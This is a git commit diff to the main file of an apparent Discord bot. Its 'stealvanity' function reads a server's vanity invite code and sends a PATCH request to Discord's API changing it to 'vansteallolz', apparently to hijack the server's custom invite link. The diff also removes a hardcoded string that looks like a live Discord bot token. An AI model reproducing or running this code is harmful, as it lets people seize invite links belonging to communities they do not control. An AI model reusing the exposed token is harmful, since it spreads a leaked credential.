188f87fa395128129cab47c7d371429ca7b6902a
vast <60797067+imvast@users.noreply.github.com>
2022-06-09 22:32:49 -0400

    v0.0.1 FIX

--- main.py
+++ main.py
@@ -11,7 +11,7 @@ async def on_ready():
 async def stealvanity(guild):
 	vcode = str(await guild.vanity_invite()).replace("https://discord.gg/", "")
 	print(f"Stealing Vanity: {vcode}")
-	headers = {'Authorization': "Bot OTg0NDk5NDg1MTUxNDczNzE0.G1iynq.ry2Q1jLuDkljB-Pmy0oKGvvsD6bjPJOctadB5Q"}
+	headers = {'Authorization': f"Bot {client.ws.token}"}
 	async with httpx.AsyncClient() as session:
 		payload1 = {'code': "vansteallolz"}
 		req1 = await session.patch(f'https://discord.com/api/v9/guilds/{guild.id}/vanity-url', json=payload1, headers=headers)
